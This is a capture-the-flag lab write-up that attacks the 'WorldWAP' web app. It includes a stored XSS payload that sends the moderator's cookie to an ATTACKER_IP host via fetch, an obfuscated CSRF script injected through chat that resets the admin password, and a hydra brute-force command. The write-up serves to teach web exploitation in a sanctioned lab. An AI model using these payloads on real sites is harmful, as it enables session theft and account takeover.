## Description
Utilise your client-side exploitation skills to take control of a web app.

## Initial Reconnaissance
- Nmap scan results (common ports)
  ![](Image%20Trunk/Pasted%20image%2020261017003659.png)
- 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
- 80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
- 8081/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

## Port 80/tcp (apache httpd)
- `/` is just empty. Response payload is just a line of http comment:
  ![](Image%20Trunk/Pasted%20image%2020261017004209.png)
- gobuster enumeration results:
  `gobuster dir -u "http://10.66.180.95/" -w ~/Documents/subdomains-top1mil-5000.txt > gobuster-80-tcp-result.txt`
  ```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.66.180.95/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/jimi/Documents/subdomains-top1mil-5000.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
phpmyadmin           (Status: 301) [Size: 317] [--> http://10.66.180.95/phpmyadmin/]
assets               (Status: 301) [Size: 313] [--> http://10.66.180.95/assets/]
===============================================================
Finished
===============================================================
  ```
  phpmyadmin is interesting. it's should be the db client for this webserver.
### /phpmyadmin
![](Image%20Trunk/Pasted%20image%2020261017005944.png)

- bruteforcing with user `root` attempt. `hydra -l root -P ~/Documents/rockyou.txt 10.66.180.95 mysql  `![](Image%20Trunk/Pasted%20image%2020261017010338.png)
  
  results: no luck
Let's skip this for now

## /login.php
![](Image%20Trunk/Pasted%20image%2020261017011328.png)
- It's a standard login form. Submitting it will send a POST request to the server.

## Adding wordwap.thm into /etc/hosts
Seems like we forgot to read the full description of the room.

![](Image%20Trunk/Pasted%20image%2020261017012241.png)

We need to add `worldwap.thm` into our `/etc/hosts`.

![](Image%20Trunk/Pasted%20image%2020261017012631.png)

## Probing WorldWAP website
![](Image%20Trunk/Pasted%20image%2020261017012656.png)

![](Image%20Trunk/Pasted%20image%2020261017012819.png)

![](Image%20Trunk/Pasted%20image%2020261017014513.png)

Trying to logged with `testusername` resulted in `User not verified`.

![](Image%20Trunk/Pasted%20image%2020261017012935.png)

Seems like a moderator must verify this account first for us to use it.

Let's try enumerating worldwap.thm with gobuster.
`gobuster dir -u "http://worldwap.thm" -w ~/Documents/subdomains-top1mil-5000.txt`
```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://worldwap.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/jimi/Documents/subdomains-top1mil-5000.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
api                  (Status: 301) [Size: 310] [--> http://worldwap.thm/api/]
phpmyadmin           (Status: 301) [Size: 317] [--> http://worldwap.thm/phpmyadmin/]
public               (Status: 301) [Size: 313] [--> http://worldwap.thm/public/]
Progress: 5000 / 5000 (100.00%)
===============================================================
Finished
===============================================================
```

Let's enumerate again from the `/api/` directory:
```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://worldwap.thm/api
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/jimi/Documents/subdomains-top1mil-5000.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
login.php            (Status: 200) [Size: 34]
register.php         (Status: 200) [Size: 48]
config.php           (Status: 200) [Size: 0]
setup.php            (Status: 200) [Size: 16]
index.php            (Status: 200) [Size: 0]
mod.php              (Status: 200) [Size: 25]
Progress: 10000 / 10000 (100.00%)
===============================================================
Finished
===============================================================
```

## login.worldwap.thm
After registering, the website actually asked us to login from here. Let's add it to our /etc/hosts as well.

It took us back to the blank website with only on line of commented html in the response body

![](Image%20Trunk/Pasted%20image%2020261017014819.png)

However, we can actually access the /login.php. Let's login from here.

![](Image%20Trunk/Pasted%20image%2020261017015232.png)

Dead end.

## XSS
Seems like we need to somehow get access to the moderator user. Since we know that the moderator need to somehow review our registration form, we can try to inject a payload into the registration form.

### Form Injection
Setting up our http server to redirect the form submission:

![](Image%20Trunk/Pasted%20image%2020261017020112.png)

injecting into payload, using `<script>fetch("http://ATTACKER_IP?cookie="+ btoa(document.cookie),{method: "GET"});</script>`, and we got the session id!
![](Image%20Trunk/Pasted%20image%2020261017141349.png)

## Using the cookie
As simple as inserting it into our cookie.

![](Image%20Trunk/Pasted%20image%2020261017141450.png)

my mistake, seems like the session id was encoded using base64, so we must decode it first and put the value again.

![](Image%20Trunk/Pasted%20image%2020261017141854.png)

![](Image%20Trunk/Pasted%20image%2020261017141904.png)

![](Image%20Trunk/Pasted%20image%2020261017142103.png)

## Probing as moderator
Accessing `login.worldwap.thm/profile.php`:

![](Image%20Trunk/Pasted%20image%2020261017142230.png)

We found our first flag!

Now for the second flag, we must access the admin panel. We'll probe around the newly accessed moderator account first. There is an interesting section called `Admin Area` on the side. There is also a `chat.php` as well.

### /chat.php
![](Image%20Trunk/Pasted%20image%2020261017142603.png)

Here, we can send message, which sends a http request:

![](Image%20Trunk/Pasted%20image%2020261017142641.png)

Analysing the traffic, we can also see that the site sends a fetch to the server every few seconds:

![](Image%20Trunk/Pasted%20image%2020261017142730.png)

![](Image%20Trunk/Pasted%20image%2020261017142756.png)

We can also click the `Reset/Move admin bot to chat.php`, which sends a GET request to endpoint `/block.php`.

changing moderator's password:
![](Image%20Trunk/Pasted%20image%2020261017143443.png)

![](Image%20Trunk/Pasted%20image%2020261017143451.png)

![](Image%20Trunk/Pasted%20image%2020261017143500.png)

Not working.

Enumerating `login.worldwap.thm/`:

```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://login.worldwap.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/jimi/Documents/subdomains-top1mil-5000.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
chat.php             (Status: 302) [Size: 0] [--> login.php]
db.php               (Status: 200) [Size: 0]
login.php            (Status: 200) [Size: 3108]
phpmyadmin           (Status: 301) [Size: 329] [--> http://login.worldwap.thm/phpmyadmin/]
assets               (Status: 301) [Size: 325] [--> http://login.worldwap.thm/assets/]
profile.php          (Status: 302) [Size: 0] [--> login.php]
logs.txt             (Status: 200) [Size: 0]
setup.php            (Status: 200) [Size: 149]
index.php            (Status: 200) [Size: 70]
Progress: 15000 / 15000 (100.00%)
===============================================================
Finished
===============================================================
```

Nothing interesting.

## CSRF On Chat
One thing that I found out after peeking another person writeup is that the chat box can be used for a CSRF attack.

![](Image%20Trunk/Pasted%20image%2020261018014552.png)

![](Image%20Trunk/Pasted%20image%2020261018014558.png)

We can actually try writing custom payload for changing the password.

This is the normal change password request:

![](Image%20Trunk/Pasted%20image%2020261018014714.png)

which got response `This feature is under development and works only if you are logged in as an admin.`. Let's try using it inside of the chat.

script:
```
<script> window.onload = function() {var form = document.createElement('form'); form.method = 'POST'; form.action = 'hT'+'tP://'+'login.worldwap.t'+'hm/change_password.php'; var input = document.createElement('input'); input.type = 'hidden'; input.name = 'new_password'; input.value = 'newpass'; form.appendChild(input); document.body.appendChild(form); form.submit(); }; </script>
```

note: the weird action value is so that it does not get translated into </a href> format.

![](Image%20Trunk/Pasted%20image%2020261018015612.png)

And we get redirected into change_password site, which means the injection worked.

## Logging in as admin with the new password

![](Image%20Trunk/Pasted%20image%2020261018015817.png)

And we are in!